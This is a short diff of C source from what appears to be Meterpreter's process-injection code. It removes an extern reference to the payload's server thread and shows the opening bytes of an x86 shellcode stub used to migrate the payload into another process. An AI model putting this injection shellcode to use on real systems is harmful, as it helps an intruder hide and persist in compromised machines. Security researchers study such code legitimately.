@@ -1,9 +1,6 @@
 #include "common.h"
 #include "base_inject.h"
 
-// An external reference to the meterpreters main server thread, so we can shutdown gracefully after successfull migration.
-extern THREAD * serverThread;
-
 // see '/msf3/external/source/shellcode/x86/migrate/migrate.asm'
 BYTE migrate_stub_x86[] =	"\xFC\x8B\x74\x24\x04\x81\xEC\x00\x20\x00\x00\xE8\x89\x00\x00\x00"
 							"\x60\x89\xE5\x31\xD2\x64\x8B\x52\x30\x8B\x52\x0C\x8B\x52\x14\x8B"
